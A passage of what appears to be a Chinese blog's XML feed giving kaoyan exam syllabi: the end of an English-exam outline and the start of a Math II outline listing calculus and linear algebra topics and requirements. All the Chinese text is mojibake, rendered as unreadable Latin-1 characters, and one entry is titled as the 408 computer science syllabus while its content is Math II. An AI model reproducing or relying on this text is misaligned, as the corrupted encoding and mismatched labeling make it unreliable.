<p>åœ¨ä¸€ç¯‡é•¿åº¦ä¸º450~550è¯çš„æ–‡ç« å‰æœ‰7ä¸ªæ¦‚æ‹¬å¥æˆ–å°æ ‡é¢˜ã€‚è¿™äº›æ–‡å­—æˆ–æ ‡é¢˜åˆ†åˆ«æ˜¯å¯¹æ–‡ç« ä¸­æŸä¸€éƒ¨åˆ†çš„æ¦‚æ‹¬æˆ–é˜è¿°ã€‚è¦æ±‚è€ƒç”Ÿæ ¹æ®æ–‡ç« å†…å®¹å’Œç¯‡ç« ç»“æ„ä»è¿™7ä¸ªé€‰é¡¹ä¸­é€‰å‡ºæœ€æ°å½“çš„5ä¸ªæ¦‚æ‹¬å¥æˆ–å°æ ‡é¢˜å¡«å…¥æ–‡ç« ç©ºç™½å¤„ã€‚</p>
<h4 id="ç¬¬ä¸‰éƒ¨åˆ†-ç¿»è¯‘"><a href="#ç¬¬ä¸‰éƒ¨åˆ†-ç¿»è¯‘" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ† ç¿»è¯‘"></a>ç¬¬ä¸‰éƒ¨åˆ† ç¿»è¯‘</h4><p>è€ƒæŸ¥è€ƒç”Ÿç†è§£æ‰€ç»™è‹±è¯­è¯­è¨€ææ–™å¹¶å°†å…¶è¯‘æˆæ±‰è¯­çš„èƒ½åŠ›ã€‚è¦æ±‚è¯‘æ–‡å‡†ç¡®ã€å®Œæ•´ã€é€šé¡ºã€‚</p>
<p>è¦æ±‚è€ƒç”Ÿé˜…è¯»ã€ç†è§£é•¿åº¦ä¸º150è¯å·¦å³çš„ä¸€ä¸ªæˆ–å‡ ä¸ªè‹±è¯­æ®µè½ï¼Œå¹¶å°†å…¶å…¨éƒ¨è¯‘æˆæ±‰è¯­ã€‚å…±15åˆ†ã€‚</p>
<h4 id="ç¬¬å››éƒ¨åˆ†-å†™ä½œ"><a href="#ç¬¬å››éƒ¨åˆ†-å†™ä½œ" class="headerlink" title="ç¬¬å››éƒ¨åˆ† å†™ä½œ"></a>ç¬¬å››éƒ¨åˆ† å†™ä½œ</h4><p>è¯¥éƒ¨åˆ†ç”±Aã€Bä¸¤èŠ‚ç»„æˆï¼Œä¸»è¦è€ƒæŸ¥è€ƒç”Ÿçš„ä¹¦é¢è¡¨è¾¾èƒ½åŠ›ã€‚å…±2é¢˜ï¼Œ25åˆ†ã€‚</p>
<p>AèŠ‚</p>
<p>è€ƒç”Ÿæ ¹æ®æ‰€ç»™æƒ…æ™¯å†™å‡ºçº¦100è¯(æ ‡ç‚¹ç¬¦å·ä¸è®¡ç®—åœ¨å†…)çš„åº”ç”¨æ€§çŸ­æ–‡ï¼ŒåŒ…æ‹¬<strong>ç§äºº</strong>å’Œ<strong>å…¬åŠ¡ä¿¡å‡½</strong>ã€<strong>å¤‡å¿˜å½•</strong>ã€<strong>æŠ¥å‘Š</strong>ç­‰ã€‚å…±10åˆ†ã€‚</p>
<p>BèŠ‚</p>
<p>è¦æ±‚è€ƒç”Ÿæ ¹æ®æ‰€è§„å®šçš„æƒ…æ™¯æˆ–ç»™å‡ºçš„æçº²ï¼Œå†™å‡ºä¸€ç¯‡150è¯å·¦å³çš„è‹±è¯­è¯´æ˜æ–‡æˆ–è®®è®ºæ–‡ã€‚æä¾›æƒ…æ™¯çš„å½¢å¼ä¸ºå›¾ç”»ã€å›¾è¡¨æˆ–æ–‡å­—ã€‚å…±15åˆ†ã€‚</p>
]]></content>
      <categories>
        <category>è‹±è¯­</category>
      </categories>
      <tags>
        <tag>è‹±è¯­</tag>
        <tag>è€ƒç ”</tag>
      </tags>
  </entry>
  <entry>
    <title>2022å¹´è€ƒç ”408è®¡ç®—æœºå­¦ç§‘è€ƒè¯•å¤§çº²</title>
    <url>/2021/10/20/%E8%80%83%E7%A0%94/2022%E5%B9%B4%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E4%BA%8C%E8%80%83%E8%AF%95%E5%A4%A7%E7%BA%B2/</url>
    <content><![CDATA[<h1 id="2022å¹´è€ƒç ”æ•°å­¦äºŒè€ƒè¯•å¤§çº²"><a href="#2022å¹´è€ƒç ”æ•°å­¦äºŒè€ƒè¯•å¤§çº²" class="headerlink" title="2022å¹´è€ƒç ”æ•°å­¦äºŒè€ƒè¯•å¤§çº²"></a>2022å¹´è€ƒç ”æ•°å­¦äºŒè€ƒè¯•å¤§çº²</h1><blockquote>
<p>å¶çº¯å®å®ä¸“ç”¨ç‰ˆ</p>
</blockquote>
<p><strong>è€ƒè¯•ç§‘ç›®ï¼š</strong>é«˜ç­‰æ•°å­¦ã€çº¿æ€§ä»£æ•°</p>
<p><strong>è€ƒè¯•å½¢å¼å’Œè¯•å·ç»“æ„</strong></p>
<p>ä¸€ã€è¯•å·æ»¡åˆ†åŠè€ƒè¯•æ—¶é—´</p>
<p>è¯•å·æ»¡åˆ†ä¸º150åˆ†ï¼Œè€ƒè¯•æ—¶é—´ä¸º180åˆ†é’Ÿ.</p>
<p>äºŒã€ç­”é¢˜æ–¹å¼</p>
<p>ç­”é¢˜æ–¹å¼ä¸ºé—­å·ã€ç¬”è¯•.</p>
<p>ä¸‰ã€è¯•å·å†…å®¹ç»“æ„</p>
<p>é«˜ç­‰æ•™å­¦ã€€çº¦80%</p>
<p>çº¿æ€§ä»£æ•°ã€€çº¦20%</p>
<p>å››ã€è¯•å·é¢˜å‹ç»“æ„</p>
<p>å•é¡¹é€‰æ‹©é¢˜ 10å°é¢˜ï¼Œæ¯å°é¢˜5åˆ†ï¼Œå…±50åˆ†</p>
<p>å¡«ç©ºé¢˜ 6å°é¢˜ï¼Œæ¯å°é¢˜5åˆ†ï¼Œå…±30åˆ†</p>
<p>è§£ç­”é¢˜(åŒ…æ‹¬è¯æ˜é¢˜) 7å°é¢˜ï¼Œå…±70åˆ†</p>
<h2 id="é«˜ç­‰æ•°å­¦"><a href="#é«˜ç­‰æ•°å­¦" class="headerlink" title="é«˜ç­‰æ•°å­¦"></a><strong>é«˜ç­‰æ•°å­¦</strong></h2><h3 id="ä¸€ã€å‡½æ•°ã€æé™ã€è¿ç»­"><a href="#ä¸€ã€å‡½æ•°ã€æé™ã€è¿ç»­" class="headerlink" title="ä¸€ã€å‡½æ•°ã€æé™ã€è¿ç»­"></a>ä¸€ã€å‡½æ•°ã€æé™ã€è¿ç»­</h3><p>å‡½æ•°çš„æ¦‚å¿µåŠè¡¨ç¤ºæ³•ã€å‡½æ•°çš„æœ‰ç•Œæ€§ã€å•è°ƒæ€§ã€å‘¨æœŸæ€§å’Œå¥‡å¶æ€§ã€å¤åˆå‡½æ•°ã€åå‡½æ•°ã€åˆ†æ®µå‡½æ•°å’Œéšå‡½æ•°ã€åŸºæœ¬åˆç­‰å‡½æ•°çš„æ€§è´¨åŠå…¶å›¾å½¢ã€åˆç­‰å‡½æ•°å‡½æ•°å…³ç³»çš„å»ºç«‹.</p>
<p>æ•°åˆ—æé™ä¸å‡½æ•°æé™çš„å®šä¹‰åŠå…¶æ€§è´¨ã€å‡½æ•°çš„å·¦æé™ä¸å³æé™ã€æ— ç©·å°é‡å’Œæ— ç©·å¤§é‡çš„æ¦‚å¿µåŠå…¶å…³ç³»ã€æ— ç©·å°é‡çš„æ€§è´¨åŠæ— ç©·å°é‡çš„æ¯”è¾ƒã€æé™çš„å››åˆ™è¿ç®—ã€æé™å­˜åœ¨çš„ä¸¤ä¸ªå‡†åˆ™:å•è°ƒæœ‰ç•Œå‡†åˆ™å’Œå¤¹é€¼å‡†åˆ™ã€ä¸¤ä¸ªé‡è¦æé™:<br>$$<br>\lim_{x\rightarrow0}\frac{sinx}{x}&#x3D;1 \ \lim_{x\rightarrow\infty}(1 + \frac{1}{x})^x&#x3D;e<br>$$<br>å‡½æ•°è¿ç»­çš„æ¦‚å¿µã€å‡½æ•°é—´æ–­ç‚¹çš„ç±»å‹ã€åˆç­‰å‡½æ•°çš„è¿ç»­æ€§ã€é—­åŒºé—´ä¸Šè¿ç»­å‡½æ•°çš„æ€§è´¨.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ç†è§£å‡½æ•°çš„æ¦‚å¿µï¼ŒæŒæ¡å‡½æ•°çš„è¡¨ç¤ºæ³•ï¼Œå¹¶ä¼šå»ºç«‹åº”ç”¨é—®é¢˜çš„å‡½æ•°å…³ç³».</p>
<p>2.äº†è§£å‡½æ•°çš„æœ‰ç•Œæ€§ã€å•è°ƒæ€§ã€å‘¨æœŸæ€§å’Œå¥‡å¶æ€§.</p>
<p>3.ç†è§£å¤åˆå‡½æ•°åŠåˆ†æ®µå‡½æ•°çš„æ¦‚å¿µã€äº†è§£åå‡½æ•°åŠéšå‡½æ•°çš„æ¦‚å¿µã€æŒæ¡åŸºæœ¬åˆç­‰å‡½æ•°çš„æ€§è´¨åŠå…¶å›¾å½¢ã€äº†è§£åˆç­‰å‡½æ•°çš„æ¦‚å¿µã€ç†è§£æé™çš„æ¦‚å¿µã€ç†è§£å‡½æ•°å·¦æé™ä¸å³æé™çš„æ¦‚å¿µä»¥åŠå‡½æ•°æé™å­˜åœ¨ä¸å·¦æé™ã€å³æé™ä¹‹é—´çš„å…³ç³».</p>
<p>4.æŒæ¡æé™çš„æ€§è´¨åŠå››åˆ™è¿ç®—æ³•åˆ™.</p>
<p>5.æŒæ¡æé™å­˜åœ¨çš„ä¸¤ä¸ªå‡†åˆ™ï¼Œå¹¶ä¼šåˆ©ç”¨å®ƒä»¬æ±‚æé™ï¼ŒæŒæ¡åˆ©ç”¨ä¸¤ä¸ªé‡è¦æé™æ±‚æé™çš„æ–¹æ³•.</p>
<p>6.ç†è§£æ— ç©·å°é‡ã€æ— ç©·å¤§é‡çš„æ¦‚å¿µï¼ŒæŒæ¡æ— ç©·å°é‡çš„æ¯”è¾ƒæ–¹æ³•,ä¼šç”¨ç­‰ä»·æ— ç©·å°é‡æ±‚æé™.</p>
<p>7.ç†è§£å‡½æ•°è¿ç»­æ€§çš„æ¦‚å¿µ(å«å·¦è¿ç»­ä¸å³è¿ç»­)ï¼Œä¼šåˆ¤åˆ«å‡½æ•°é—´æ–­ç‚¹çš„ç±»å‹.</p>
<p>8.äº†è§£è¿ç»­å‡½æ•°çš„æ€§è´¨å’Œåˆç­‰å‡½æ•°çš„è¿ç»­æ€§,ç†è§£é—­åŒºé—´ä¸Šè¿ç»­å‡½æ•°çš„æ€§è´¨(æœ‰ç•Œæ€§ã€æœ€å¤§å€¼å’Œæœ€å°å€¼å®šç†ã€ä»‹å€¼å®šç†)ï¼Œå¹¶ä¼šåº”ç”¨è¿™äº›æ€§è´¨.</p>
<h3 id="äºŒã€ä¸€å…ƒå‡½æ•°å¾®åˆ†å­¦"><a href="#äºŒã€ä¸€å…ƒå‡½æ•°å¾®åˆ†å­¦" class="headerlink" title="äºŒã€ä¸€å…ƒå‡½æ•°å¾®åˆ†å­¦"></a>äºŒã€ä¸€å…ƒå‡½æ•°å¾®åˆ†å­¦</h3><p>å¯¼æ•°å’Œå¾®åˆ†çš„æ¦‚å¿µã€å¯¼æ•°çš„å‡ ä½•æ„ä¹‰å’Œç‰©ç†æ„ä¹‰ã€å‡½æ•°çš„å¯å¯¼æ€§ä¸è¿ç»­æ€§ä¹‹é—´çš„å…³ç³»ã€å¹³é¢æ›²çº¿çš„åˆ‡çº¿å’Œæ³•çº¿ã€å¯¼æ•°å’Œå¾®åˆ†çš„å››åˆ™è¿ç®—ã€åŸºæœ¬åˆç­‰å‡½æ•°çš„å¯¼æ•°ã€å¤åˆå‡½æ•°ã€åå‡½æ•°ã€éšå‡½æ•°ä»¥åŠå‚æ•°æ–¹ç¨‹æ‰€ç¡®å®šçš„å‡½æ•°çš„å¾®åˆ†æ³•ã€é«˜é˜¶å¯¼æ•°ã€ä¸€é˜¶å¾®åˆ†å½¢å¼çš„ä¸å˜æ€§ã€å¾®åˆ†ä¸­å€¼å®šç†æ´›å¿…è¾¾æ³•åˆ™ã€å‡½æ•°å•è°ƒæ€§çš„åˆ¤åˆ«ã€å‡½æ•°çš„æå€¼ã€å‡½æ•°å›¾å½¢çš„å‡¹å‡¸æ€§ã€æ‹ç‚¹åŠæ¸è¿‘çº¿ã€å‡½æ•°å›¾å½¢çš„æç»˜ã€å‡½æ•°çš„æœ€å¤§å€¼ä¸æœ€å°å€¼ã€å¼§å¾®åˆ†ã€æ›²ç‡çš„æ¦‚å¿µã€æ›²ç‡åœ†ä¸æ›²ç‡åŠå¾„.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ç†è§£å¯¼æ•°å’Œå¾®åˆ†çš„æ¦‚å¿µï¼Œç†è§£å¯¼æ•°ä¸å¾®åˆ†çš„å…³ç³»ï¼Œç†è§£å¯¼æ•°çš„å‡ ä½•æ„ä¹‰ï¼Œä¼šæ±‚å¹³é¢æ›²çº¿çš„åˆ‡çº¿æ–¹ç¨‹å’Œæ³•çº¿æ–¹ç¨‹ï¼Œäº†è§£å¯¼æ•°çš„ç‰©ç†æ„ä¹‰ï¼Œä¼šç”¨å¯¼æ•°æè¿°ä¸€äº›ç‰©ç†é‡,ç†è§£å‡½æ•°çš„å¯å¯¼æ€§ä¸è¿ç»­æ€§ä¹‹é—´çš„å…³ç³».</p>
<p>2.æŒæ¡å¯¼æ•°çš„å››åˆ™è¿ç®—æ³•åˆ™å’Œå¤åˆå‡½æ•°çš„æ±‚å¯¼æ³•åˆ™ï¼ŒæŒæ¡åŸºæœ¬åˆç­‰å‡½æ•°çš„å¯¼æ•°å…¬å¼.äº†è§£å¾®åˆ†çš„å››åˆ™è¿ç®—æ³•åˆ™å’Œä¸€é˜¶å¾®åˆ†å½¢å¼çš„ä¸å˜æ€§ï¼Œä¼šæ±‚å‡½æ•°çš„å¾®åˆ†.</p>
<p>3.äº†è§£é«˜é˜¶å¯¼æ•°çš„æ¦‚å¿µï¼Œä¼šæ±‚ç®€å•å‡½æ•°çš„é«˜é˜¶å¯¼æ•°.</p>
<p>4.ä¼šæ±‚åˆ†æ®µå‡½æ•°çš„å¯¼æ•°ï¼Œä¼šæ±‚éšå‡½æ•°å’Œç”±å‚æ•°æ–¹ç¨‹æ‰€ç¡®å®šçš„å‡½æ•°ä»¥åŠåå‡½æ•°çš„å¯¼æ•°.</p>
<p>5.ç†è§£å¹¶ä¼šç”¨ç½—å°”å®šç†ã€æ‹‰æ ¼æœ—æ—¥ä¸­å€¼å®šç†å’Œæ³°å‹’å®šç†ï¼Œäº†è§£å¹¶ä¼šç”¨æŸ¯è¥¿ä¸­å€¼å®šç†.</p>
<p>6.æŒæ¡ç”¨æ´›å¿…è¾¾æ³•åˆ™æ±‚æœªå®šå¼æé™çš„æ–¹æ³•.</p>
<p>7.ç†è§£å‡½æ•°çš„æå€¼æ¦‚å¿µï¼ŒæŒæ¡ç”¨å¯¼æ•°åˆ¤æ–­å‡½æ•°çš„å•è°ƒæ€§å’Œæ±‚å‡½æ•°æå€¼çš„æ–¹æ³•,æŒæ¡å‡½æ•°æœ€å¤§å€¼å’Œæœ€å°å€¼çš„æ±‚æ³•åŠå…¶åº”ç”¨.</p>
<p>8.ä¼šç”¨å¯¼æ•°åˆ¤æ–­å‡½æ•°å›¾å½¢çš„å‡¹å‡¸æ€§(æ³¨:åœ¨åŒºé—´(a.b)å†…,è®¾å‡½æ•°(x)å…·æœ‰äºŒé˜¶å¯¼æ•°å½“fâ€(x)&gt;0 æ—¶ï¼Œf(x)çš„å›¾å½¢æ˜¯å‡¹çš„;å½“fâ€(X)&lt;0æ—¶,f(X)çš„å›¾å½¢æ˜¯å‡¸çš„)ï¼Œä¼šæ±‚å‡½æ•°å›¾å½¢çš„æ‹ç‚¹ä»¥åŠæ°´å¹³ã€é“…ç›´å’Œæ–œæ¸è¿‘çº¿,ä¼šæç»˜å‡½æ•°çš„å›¾å½¢.</p>
<p>9.äº†è§£æ›²ç‡ã€æ›²ç‡åœ†å’Œæ›²ç‡åŠå¾„çš„æ¦‚å¿µï¼Œä¼šè®¡ç®—æ›²ç‡å’Œæ›²ç‡åŠå¾„.</p>
<h3 id="ä¸‰ã€ä¸€å…ƒå‡½æ•°ç§¯åˆ†å­¦"><a href="#ä¸‰ã€ä¸€å…ƒå‡½æ•°ç§¯åˆ†å­¦" class="headerlink" title="ä¸‰ã€ä¸€å…ƒå‡½æ•°ç§¯åˆ†å­¦"></a>ä¸‰ã€ä¸€å…ƒå‡½æ•°ç§¯åˆ†å­¦</h3><p>åŸå‡½æ•°å’Œä¸å®šç§¯åˆ†çš„æ¦‚å¿µã€ä¸å®šç§¯åˆ†çš„åŸºæœ¬æ€§è´¨ã€åŸºæœ¬ç§¯åˆ†å…¬:å¼ã€å®šç§¯åˆ†çš„æ¦‚å¿µå’ŒåŸºæœ¬æ€§è´¨ã€å®šç§¯åˆ†ä¸­å€¼å®šç†ã€ç§¯åˆ†ä¸Šé™çš„å‡½æ•°åŠå…¶å¯¼æ•°ã€ç‰›é¡¿-èœå¸ƒå°¼èŒ¨(Newton-Leibniz)å…¬å¼ã€ä¸å®šç§¯åˆ†å’Œå®šç§¯åˆ†çš„æ¢å…ƒç§¯åˆ†æ³•ä¸åˆ†éƒ¨ç§¯åˆ†æ³•ã€æœ‰ç†å‡½æ•°ã€ä¸‰è§’å‡½æ•°çš„æœ‰ç†å¼å’Œç®€å•æ— ç†å‡½æ•°çš„ç§¯åˆ†ã€åå¸¸(å¹¿ä¹‰)ç§¯åˆ†ã€å®šç§¯åˆ†çš„åº”ç”¨.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ç†è§£åŸå‡½æ•°çš„æ¦‚å¿µï¼Œç†è§£ä¸å®šç§¯åˆ†å’Œå®šç§¯åˆ†çš„æ¦‚å¿µ.</p>
<p>2.æŒæ¡ä¸å®šç§¯åˆ†çš„åŸºæœ¬å…¬å¼ï¼ŒæŒæ¡ä¸å®šç§¯åˆ†å’Œå®šç§¯åˆ†çš„æ€§è´¨åŠå®šç§¯åˆ†ä¸­å€¼å®šç†ï¼ŒæŒæ¡æ¢å…ƒç§¯åˆ†æ³•ä¸åˆ†éƒ¨ç§¯åˆ†æ³•.</p>
<p>3.ä¼šæ±‚æœ‰ç†å‡½æ•°ã€ä¸‰è§’å‡½æ•°æœ‰ç†å¼å’Œç®€å•æ— ç†å‡½æ•°çš„ç§¯åˆ†.</p>
<p>4.ç†è§£ç§¯åˆ†ä¸Šé™çš„å‡½æ•°ï¼Œä¼šæ±‚å®ƒçš„å¯¼æ•°ï¼ŒæŒæ¡ç‰›é¡¿ä¸€èœå¸ƒå°¼èŒ¨å…¬å¼.</p>
<p>5.äº†è§£åå¸¸ç§¯åˆ†çš„æ¦‚å¿µï¼Œä¼šè®¡ç®—åå¸¸ç§¯åˆ†.</p>
<p>6.æŒæ¡ç”¨å®šç§¯åˆ†è¡¨è¾¾å’Œè®¡ç®—ä¸€äº›å‡ ä½•é‡ä¸ç‰©ç†é‡(å¹³é¢å›¾å½¢çš„é¢ç§¯ã€å¹³é¢æ›²çº¿çš„å¼§é•¿ã€æ—‹è½¬ä½“çš„ä½“ç§¯åŠä¾§é¢ç§¯ã€å¹³è¡Œæˆªé¢é¢ç§¯ä¸ºå·²çŸ¥çš„ç«‹ä½“ä½“ç§¯ã€åŠŸã€å¼•åŠ›ã€å‹åŠ›ã€è´¨å¿ƒã€å½¢å¿ƒç­‰)åŠå‡½æ•°çš„å¹³å‡å€¼.</p>
<h3 id="å››ã€å¤šå…ƒå‡½æ•°å¾®ç§¯åˆ†å­¦"><a href="#å››ã€å¤šå…ƒå‡½æ•°å¾®ç§¯åˆ†å­¦" class="headerlink" title="å››ã€å¤šå…ƒå‡½æ•°å¾®ç§¯åˆ†å­¦"></a>å››ã€å¤šå…ƒå‡½æ•°å¾®ç§¯åˆ†å­¦</h3><p>å¤šå…ƒå‡½æ•°çš„æ¦‚å¿µã€äºŒå…ƒå‡½æ•°çš„å‡ ä½•æ„ä¹‰ã€äºŒå…ƒå‡½æ•°çš„æé™ä¸è¿ç»­çš„æ¦‚å¿µã€æœ‰ç•Œé—­åŒºåŸŸ.ä¸ŠäºŒå…ƒè¿ç»­å‡½æ•°çš„æ€§è´¨ã€å¤šå…ƒå‡½æ•°çš„åå¯¼æ•°å’Œå…¨å¾®åˆ†ã€å¤šå…ƒå¤åˆå‡½æ•°ã€éšå‡½æ•°çš„æ±‚å¯¼æ³•ã€äºŒé˜¶åå¯¼æ•°ã€å¤šå…ƒå‡½æ•°çš„æå€¼å’Œæ¡ä»¶æå€¼ã€æœ€å¤§å€¼å’Œæœ€å°å€¼ã€äºŒé‡ç§¯åˆ†çš„æ¦‚å¿µã€åŸºæœ¬æ€§è´¨å’Œè®¡ç®—.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.äº†è§£å¤šå…ƒå‡½æ•°çš„æ¦‚å¿µï¼Œäº†è§£äºŒå…ƒå‡½æ•°çš„å‡ ä½•æ„ä¹‰.</p>
<p>2.äº†è§£äºŒå…ƒå‡½æ•°çš„æé™ä¸è¿ç»­çš„æ¦‚å¿µï¼Œäº†è§£æœ‰ç•Œé—­åŒºåŸŸä¸ŠäºŒå…ƒè¿ç»­å‡½æ•°çš„æ€§è´¨.</p>
<p>3.äº†è§£å¤šå…ƒå‡½æ•°åå¯¼æ•°ä¸å…¨å¾®åˆ†çš„æ¦‚å¿µï¼Œä¼šæ±‚å¤šå…ƒå¤åˆå‡½æ•°ä¸€é˜¶ã€äºŒé˜¶åå¯¼æ•°ï¼Œä¼šæ±‚å…¨å¾®åˆ†ï¼Œäº†è§£éšå‡½æ•°å­˜åœ¨å®šç†ï¼Œä¼šæ±‚å¤šå…ƒéšå‡½æ•°çš„åå¯¼æ•°.</p>
<p>4.äº†è§£å¤šå…ƒå‡½æ•°æå€¼å’Œæ¡ä»¶æå€¼çš„æ¦‚å¿µï¼ŒæŒæ¡å¤šå…ƒå‡½æ•°æå€¼å­˜åœ¨çš„å¿…è¦æ¡ä»¶ï¼Œäº†è§£äºŒå…ƒå‡½æ•°æå€¼å­˜åœ¨çš„å……åˆ†æ¡ä»¶ï¼Œä¼šæ±‚äºŒå…ƒå‡½æ•°çš„æå€¼ï¼Œä¼šç”¨æ‹‰æ ¼æœ—æ—¥ä¹˜æ•°æ³•æ±‚æ¡ä»¶æå€¼ï¼Œä¼šæ±‚ç®€å•å¤šå…ƒå‡½æ•°çš„æœ€å¤§å€¼å’Œæœ€å°.å€¼ï¼Œå¹¶ä¼šè§£å†³ä¸€äº›ç®€å•çš„åº”ç”¨é—®é¢˜.</p>
<p>5.äº†è§£äºŒé‡ç§¯åˆ†çš„æ¦‚å¿µä¸åŸºæœ¬æ€§è´¨ï¼ŒæŒæ¡äºŒé‡ç§¯åˆ†çš„è®¡ç®—æ–¹æ³•(ç›´è§’åæ ‡ã€æåæ ‡).</p>
<h3 id="äº”ã€å¸¸å¾®åˆ†æ–¹ç¨‹"><a href="#äº”ã€å¸¸å¾®åˆ†æ–¹ç¨‹" class="headerlink" title="äº”ã€å¸¸å¾®åˆ†æ–¹ç¨‹"></a>äº”ã€å¸¸å¾®åˆ†æ–¹ç¨‹</h3><p>å¸¸å¾®åˆ†æ–¹ç¨‹çš„åŸºæœ¬æ¦‚å¿µã€å˜é‡å¯åˆ†ç¦»çš„å¾®åˆ†ã€é½æ¬¡å¾®åˆ†æ–¹ç¨‹ã€ä¸€é˜¶çº¿æ€§å¾®åˆ†æ–¹ç¨‹ã€å¯é™é˜¶çš„é«˜é˜¶å¾®åˆ†æ–¹ç¨‹ã€çº¿æ€§å¾®åˆ†æ–¹ç¨‹è§£çš„æ€§è´¨åŠè§£çš„ç»“æ„å®šç†ã€äºŒé˜¶å¸¸ç³»æ•°é½æ¬¡çº¿æ€§å¾®åˆ†æ–¹ç¨‹ã€é«˜äºäºŒé˜¶çš„æŸäº›å¸¸ç³»æ•°é½æ¬¡çº¿æ€§å¾®åˆ†æ–¹ç¨‹ã€ç®€å•çš„äºŒé˜¶å¸¸ç³»æ•°éé½æ¬¡çº¿æ€§å¾®åˆ†æ–¹ç¨‹ã€å¾®åˆ†æ–¹ç¨‹çš„ç®€å•åº”ç”¨.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.äº†è§£å¾®åˆ†æ–¹ç¨‹åŠå…¶é˜¶ã€è§£ã€é€šè§£ã€åˆå§‹æ¡ä»¶å’Œç‰¹è§£ç­‰æ¦‚å¿µ.</p>
<p>2.æŒæ¡å˜é‡å¯åˆ†ç¦»çš„å¾®åˆ†æ–¹ç¨‹åŠä¸€-é˜¶çº¿æ€§å¾®åˆ†æ–¹ç¨‹çš„è§£æ³•,ä¼šè§£é½æ¬¡å¾®åˆ†æ–¹ç¨‹.</p>
<p>3.ä¼šç”¨é™é˜¶æ³•è§£ä¸‹åˆ—å½¢å¼çš„å¾®åˆ†æ–¹ç¨‹: yâ€&#x3D;f(x)ã€yâ€&#x3D; f(x,yâ€™)å’Œyâ€&#x3D;f(y,yâ€™).</p>
<p>4.ç†è§£äºŒé˜¶çº¿æ€§å¾®åˆ†æ–¹ç¨‹è§£çš„æ€§è´¨åŠè§£çš„ç»“æ„å®šç†.</p>
<p>5.æŒæ¡äºŒé˜¶å¸¸ç³»æ•°é½æ¬¡çº¿æ€§å¾®åˆ†æ–¹ç¨‹çš„è§£æ³•ï¼Œå¹¶ä¼šè§£æŸäº›é«˜äºäºŒé˜¶çš„å¸¸ç³»æ•°é½æ¬¡çº¿æ€§å¾®åˆ†æ–¹ç¨‹.</p>
<p>6.ä¼šè§£è‡ªç”±é¡¹ä¸ºå¤šé¡¹å¼ã€æŒ‡æ•°å‡½æ•°ã€æ­£å¼¦å‡½æ•°ã€ä½™å¼¦å‡½æ•°ä»¥åŠå®ƒä»¬çš„å’Œä¸ç§¯çš„äºŒé˜¶å¸¸ç³»æ•°éé½æ¬¡çº¿æ€§å¾®åˆ†æ–¹ç¨‹.</p>
<p>7.ä¼šç”¨å¾®åˆ†æ–¹ç¨‹è§£å†³ä¸€äº›ç®€å•çš„åº”ç”¨é—®é¢˜.</p>
<h2 id="çº¿æ€§ä»£æ•°"><a href="#çº¿æ€§ä»£æ•°" class="headerlink" title="çº¿æ€§ä»£æ•°"></a><strong>çº¿æ€§ä»£æ•°</strong></h2><h3 id="ä¸€ã€è¡Œåˆ—å¼"><a href="#ä¸€ã€è¡Œåˆ—å¼" class="headerlink" title="ä¸€ã€è¡Œåˆ—å¼"></a>ä¸€ã€è¡Œåˆ—å¼</h3><p>è¡Œåˆ—å¼çš„æ¦‚å¿µå’ŒåŸºæœ¬æ€§è´¨ã€è¡Œåˆ—å¼æŒ‰è¡Œ(åˆ—)å±•å¼€å®šç†.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.äº†è§£è¡Œåˆ—å¼çš„æ¦‚å¿µï¼ŒæŒæ¡è¡Œåˆ—å¼çš„æ€§è´¨.</p>
<p>2.ä¼šåº”ç”¨è¡Œåˆ—å¼çš„æ€§è´¨å’Œè¡Œåˆ—å¼æŒ‰è¡Œ(åˆ—)å±•å¼€å®šç†è®¡ç®—è¡Œåˆ—å¼.</p>
<h3 id="äºŒã€çŸ©é˜µ"><a href="#äºŒã€çŸ©é˜µ" class="headerlink" title="äºŒã€çŸ©é˜µ"></a>äºŒã€çŸ©é˜µ</h3><p>çŸ©é˜µçš„æ¦‚å¿µã€çŸ©é˜µçš„çº¿æ€§è¿ç®—ã€çŸ©é˜µçš„ä¹˜æ³•ã€æ–¹é˜µçš„å¹‚ã€æ–¹é˜µä¹˜ç§¯çš„è¡Œåˆ—å¼ã€çŸ©é˜µçš„è½¬ç½®ã€é€†çŸ©é˜µçš„æ¦‚å¿µå’Œæ€§è´¨ã€çŸ©é˜µå¯é€†çš„å……åˆ†å¿….è¦æ¡ä»¶ã€ä¼´éšçŸ©é˜µã€çŸ©é˜µçš„åˆç­‰å˜æ¢ã€åˆç­‰çŸ©é˜µã€çŸ©é˜µçš„ç§©ã€çŸ©é˜µçš„ç­‰ä»·ã€åˆ†å—çŸ©é˜µåŠå…¶è¿ç®—.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ç†è§£çŸ©é˜µçš„æ¦‚å¿µï¼Œäº†è§£å•ä½çŸ©é˜µã€æ•°é‡çŸ©é˜µã€å¯¹è§’çŸ©é˜µã€ä¸‰è§’çŸ©é˜µã€å¯¹ç§°çŸ©é˜µã€åå¯¹ç§°çŸ©é˜µå’Œæ­£äº¤çŸ©é˜µä»¥åŠå®ƒä»¬çš„æ€§è´¨.</p>
<p>2.æŒæ¡çŸ©é˜µçš„çº¿æ€§è¿ç®—ã€ä¹˜æ³•ã€è½¬ç½®ä»¥åŠå®ƒä»¬çš„è¿ç®—è§„å¾‹ï¼Œäº†è§£æ–¹é˜µçš„å¹‚ä¸æ–¹é˜µä¹˜ç§¯çš„è¡Œåˆ—å¼çš„æ€§è´¨.</p>
<p>3.ç†è§£é€†çŸ©é˜µçš„æ¦‚å¿µï¼ŒæŒæ¡é€†çŸ©é˜µçš„æ€§è´¨ä»¥åŠçŸ©é˜µå¯é€†çš„å……åˆ†å¿…è¦æ¡ä»¶.ç†è§£ä¼´éšçŸ©é˜µçš„æ¦‚å¿µï¼Œä¼šç”¨ä¼´éšçŸ©é˜µæ±‚é€†çŸ©é˜µ.</p>
